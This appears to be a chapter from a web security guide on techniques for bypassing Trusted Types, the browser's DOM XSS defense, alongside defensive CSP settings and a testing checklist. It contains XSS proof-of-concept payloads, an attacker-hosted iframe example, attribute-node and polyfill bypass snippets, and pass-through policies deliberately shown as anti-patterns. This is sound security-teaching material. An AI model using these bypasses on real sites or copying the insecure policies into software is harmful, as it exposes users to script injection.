# 46 - Trusted Types Bypass Techniques

## Overview

Trusted Types is a browser security mechanism that enforces sink-level controls on DOM XSS, requiring all DOM XSS sinks (innerHTML, document.write, eval, etc.) to receive a TrustedHTML/TrustedScript/TrustedScriptURL object rather than a raw string. Applications must define a policy that creates these objects, making the policy the single auditable chokepoint. Trusted Types reached Baseline browser support in early 2026. While architecturally robust, several bypass techniques have been documented from 2024-2026, ranging from cross-origin iframe escapes to default policy abuse and prototype pollution chains.

**Sources**: [Confiant - MutantBedrog Research](https://www.confiant.com/), [URIPorts Blog - CSP Trusted Types](https://www.uriports.com/blog/csp-trusted-types/), [DEV Community - Trusted Types Baseline](https://dev.to/grimicorn/trusted-types-is-baseline-dom-xss-is-now-a-type-error-1k1h), [Interop 2025 Issue 1465](https://github.com/web-platform-tests/interop/issues/1465)

---

## 1. Browser Support Timeline

| Browser | Version | Date | Notes |
|---------|---------|------|-------|
| Chrome/Edge | 83+ | 2020 | First implementation |
| Safari | 26+ | September 2025 | Added via Interop 2025 |
| Firefox | 148+ | February 2026 | Completes Baseline status |
| Interop 2025 | Focus area | 2025 | Cross-browser standardization effort |

With Firefox 148 (February 2026), Trusted Types achieved "Baseline" status -- available in all major browsers. This makes it viable as a primary DOM XSS defense for all modern web applications.

**Source**: [Interop Issue 1465](https://github.com/web-platform-tests/interop/issues/1465), [DEV Community](https://dev.to/grimicorn/trusted-types-is-baseline-dom-xss-is-now-a-type-error-1k1h)

---

## 2. How Trusted Types Works

### CSP Enforcement

Trusted Types is activated via Content Security Policy:

```
Content-Security-Policy: require-trusted-types-for 'script'
```

This directive makes all DOM XSS sinks reject raw strings and require Trusted Type objects instead.

### Policy Creation

```javascript
// Create a named policy
const escapePolicy = trustedTypes.createPolicy('escapePolicy', {
  createHTML: (string) => {
    return string.replace(/</g, '&lt;').replace(/>/g, '&gt;');
  },
  createScriptURL: (string) => {
    const url = new URL(string, document.baseURI);
    if (url.origin === location.origin) return url.href;
    throw new TypeError('Invalid script URL');
  },
  createScript: (string) => {
    throw new TypeError('Script creation is not allowed');
  }
});

// Use the policy to create safe values
element.innerHTML = escapePolicy.createHTML(userInput);  // Works
element.innerHTML = userInput;  // TypeError: requires TrustedHTML
```

### Default Policy

A special "default" policy is called automatically when a raw string is assigned to a sink:

```javascript
trustedTypes.createPolicy('default', {
  createHTML: (string, sink) => {
    // Called automatically for every innerHTML, insertAdjacentHTML, etc.
    return DOMPurify.sanitize(string);
  },
  createScriptURL: (string, sink) => {
    // Called automatically for every script.src, import(), etc.
    if (isAllowedUrl(string)) return string;
    throw new TypeError(`Blocked script URL: ${string}`);
  }
});
```

**Source**: [URIPorts Blog](https://www.uriports.com/blog/csp-trusted-types/)

---

## 3. Bypass Techniques

### 3.1 Attribute Node Manipulation (Masato Kinugawa)

Masato Kinugawa's research demonstrated that attribute nodes can be used to bypass Trusted Types enforcement in certain scenarios. The core insight: manipulating attribute nodes directly through the DOM API can bypass the sink-level enforcement because attribute manipulation methods may not be covered by the same Trusted Types checks as innerHTML.

```javascript
// Standard approach (blocked by Trusted Types):
element.innerHTML = '<img src=x onerror=alert(1)>';  // TypeError

// Attribute node manipulation approach:
const attr = document.createAttribute('onclick');
attr.value = 'alert(1)';
element.setAttributeNode(attr);  // May bypass in certain implementations
```

This technique exploits gaps in the coverage of Trusted Types enforcement across all DOM mutation APIs.

### 3.2 Cross-Origin Iframe Escape

The primary known bypass technique documented in public research. CSP's `require-trusted-types-for` is **not propagated** to cross-origin iframes. Only local-scheme iframes inherit the CSP directive.

```html
<!-- Parent page with Trusted Types enforced -->
<!-- CSP: require-trusted-types-for 'script' -->

<!-- Network-served iframe does NOT inherit Trusted Types CSP -->
<iframe src="https://attacker.com/frame.html"></iframe>

<!-- Inside attacker.com/frame.html: -->
<!-- No Trusted Types enforcement here -->
<!-- The iframe can create its own policies freely -->
<script>
  // Attacker's iframe is unrestricted
  document.body.innerHTML = '<img src=x onerror=alert(1)>';
  // This works because the iframe has its own CSP (or none)
</script>
```

The Trusted Types specification explicitly warns about this collusion risk. The bypass is an architectural limitation of CSP inheritance, not a flaw in Trusted Types itself.

**Exploitation requirements:**
- The application loads an attacker-controlled iframe (or an iframe the attacker can compromise)
- The iframe is served over the network (not a local scheme like data: or blob:)
- The parent's CSP allows the iframe source

**Source**: [Trusted Types Specification - Security Considerations]

### 3.3 Default Policy Abuse

The "default" policy is the most dangerous configuration point. If it is overly permissive, it provides no security benefit:

```javascript
// DANGEROUS: Permissive default policy (effectively disables Trusted Types)
trustedTypes.createPolicy('default', {
  createHTML: (s) => s,           // Pass-through -- NO SANITIZATION
  createScript: (s) => s,         // Pass-through -- NO SANITIZATION
  createScriptURL: (s) => s       // Pass-through -- NO SANITIZATION
});

// Now all sinks accept raw strings via the default policy:
element.innerHTML = '<img src=x onerror=alert(1)>';  // XSS succeeds
```

**Common anti-patterns:**

```javascript
// Anti-pattern 1: Logging-only default policy
trustedTypes.createPolicy('default', {
  createHTML: (s) => {
    console.warn('Untrusted HTML:', s);  // Logs but still allows
    return s;
  }
});

// Anti-pattern 2: Default policy that uses a vulnerable sanitizer
trustedTypes.createPolicy('default', {
  createHTML: (s) => DOMPurify.sanitize(s)  // DOMPurify bypasses = TT bypasses
});
// Any DOMPurify CVE (e.g., CVE-2026-41238) directly translates to a Trusted Types bypass

// Anti-pattern 3: Exception-based allow-listing that is too broad
trustedTypes.createPolicy('default', {
  createHTML: (s, sink) => {
    if (sink === 'Element innerHTML') return s;  // Too broad
    throw new TypeError('Blocked');
  }
});
```

### 3.4 DOMPurify as Trusted Types Policy Backend

A very common pattern is using DOMPurify as the implementation behind a Trusted Types policy:

```javascript
trustedTypes.createPolicy('default', {
  createHTML: (s) => DOMPurify.sanitize(s)
});
```

**Critical implication:** Every DOMPurify bypass directly translates to a Trusted Types bypass when this pattern is used. The 8+ DOMPurify CVEs from 2024-2026 (see Chapter 16) all become Trusted Types bypasses in applications using this configuration.

Specific examples:
- **CVE-2026-41238** (prototype pollution): Polluting `Object.prototype.tagNameCheck` allows arbitrary custom elements through DOMPurify, which are then trusted by the Trusted Types policy
- **CVE-2026-47423** (selectedcontent): The selectedcontent bypass passes through DOMPurify and is blessed by the Trusted Types policy
- **CVE-2024-47875** (nesting mXSS): The mXSS payload passes through sanitization and is wrapped in a TrustedHTML object

### 3.5 Polyfill Circumvention

Before Baseline support (pre-2026), many applications used the Trusted Types polyfill. The polyfill has fundamentally weaker enforcement:

```javascript
// The polyfill cannot truly enforce at the engine level
// It monkey-patches DOM setter functions:
// - Element.prototype.innerHTML setter
// - document.write
// - etc.

// Bypass 1: Direct property definition
Object.defineProperty(element, 'innerHTML', {
  set: function(v) {
    // Original setter, bypassing the polyfill's monkey-patch
    HTMLElement.prototype.innerHTML.__lookupSetter__('innerHTML').call(this, v);
  }
});

// Bypass 2: Using a different reference to the original setter
// If the polyfill did not patch all paths to the setter

// Bypass 3: Prototype manipulation to restore original setters
// The polyfill stores original setters that can potentially be recovered
```

**Note:** With Baseline support in all major browsers (2026), the polyfill is becoming less relevant, but legacy applications may still rely on it.

### 3.6 MutantBedrog Campaign (2024)

Confiant's research documented the MutantBedrog campaign, which exploited the cross-origin iframe CSP inheritance gap for malvertising. The campaign used the following approach:

1. Malvertising payload loaded via a network-served iframe
2. The parent page's `require-trusted-types-for 'script'` CSP was not inherited by the ad iframe
3. The ad iframe created its own trustedTypes policy unrestricted
4. Malicious scripts executed within the iframe context
5. Used DOM manipulation to affect the parent page's visual content (where allowed by same-origin policy)

The campaign demonstrated that Trusted Types provides defense in depth for the protected page but cannot prevent malicious behavior in cross-origin frames that the page deliberately embeds.

**Source**: [Confiant Research - MutantBedrog]

---

## 4. Trusted Types + DOMPurify Integration Best Practices

```javascript
// RECOMMENDED: Named policy with latest DOMPurify, strict configuration
const purifyPolicy = trustedTypes.createPolicy('purify', {
  createHTML: (input) => DOMPurify.sanitize(input, {
    // Strict configuration - no ALLOW_UNKNOWN_PROTOCOLS, no ADD_TAGS
    USE_PROFILES: { html: true },
    FORBID_TAGS: ['style', 'form'],
    FORBID_ATTR: ['style']
  })
});

// Use the named policy explicitly
element.innerHTML = purifyPolicy.createHTML(userInput);

// DO NOT create a permissive default policy as a fallback
// Instead, let the default policy throw to catch any unprotected sinks
trustedTypes.createPolicy('default', {
  createHTML: (s, sink) => {
    // Report and block
    reportViolation('Unprotected sink', sink, s);
    throw new TypeError(`Untrusted HTML assigned to ${sink}`);
  }
});
```

---

## 5. Defensive Architecture

### CSP Configuration

```
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types purify
```

The `trusted-types` directive limits which policy names can be created. This prevents attackers from creating their own policies even if they achieve JavaScript execution within the same origin.

### Frame-Level Defense

```
Content-Security-Policy: require-trusted-types-for 'script'; frame-src 'self'
```

Restricting iframe sources mitigates the cross-origin iframe bypass by preventing untrusted frames from loading.

### Policy Auditing

With Trusted Types, security auditing focuses on policy implementations rather than every DOM sink:

```javascript
// The security boundary is the policy, not the sinks
// Audit checklist:
// 1. How many policies exist? (fewer is better)
// 2. Does each policy actually sanitize? (no pass-through)
// 3. Is the default policy restrictive? (should throw, not pass through)
// 4. Are policy names restricted via CSP trusted-types directive?
// 5. Is DOMPurify kept up to date if used as the sanitizer?
// 6. Are cross-origin iframes restricted?
```

---

## 6. Testing Methodology

1. **Check CSP headers**: Look for `require-trusted-types-for 'script'` in the CSP
2. **Identify policies**: Search JavaScript for `trustedTypes.createPolicy` calls
3. **Audit default policy**: If present, check if it passes through unsanitized content
4. **Test iframe inheritance**: Load a cross-origin iframe and test if Trusted Types applies
5. **Test DOMPurify version**: If DOMPurify is used in a policy, check for known CVEs
6. **Test polyfill vs native**: Determine if the application uses the polyfill or native API
7. **Test attribute manipulation**: Try setAttributeNode and other DOM mutation APIs
8. **Test policy name restrictions**: Check if the CSP `trusted-types` directive limits policy names
9. **Enumerate sinks**: Find all DOM XSS sinks and verify they are covered by Trusted Types
10. **Test prototype pollution**: If a PP source exists, check if it can pollute DOMPurify's behavior through Trusted Types

---

## References

- [URIPorts Blog - CSP Trusted Types](https://www.uriports.com/blog/csp-trusted-types/)
- [DEV Community - Trusted Types is Baseline](https://dev.to/grimicorn/trusted-types-is-baseline-dom-xss-is-now-a-type-error-1k1h)
- [Interop 2025 - Issue 1465](https://github.com/web-platform-tests/interop/issues/1465)
- [Frederik Braun - Why the Sanitizer API is just setHTML()](https://frederikbraun.de/why-sethtml.html)
- [Mozilla Bugzilla 1669945](https://bugzilla.mozilla.org/show_bug.cgi?id=1669945)
- [DOMPurify Wiki - Attack Classes & Bypass History](https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History)
- [GitHub Advisory GHSA-v9jr-rg53-9pgp - DOMPurify Prototype Pollution](https://github.com/advisories/GHSA-v9jr-rg53-9pgp)
- [Confiant - MutantBedrog Malvertising Campaign Research](https://www.confiant.com/)
- [W3C - Trusted Types Specification](https://w3c.github.io/trusted-types/dist/spec/)
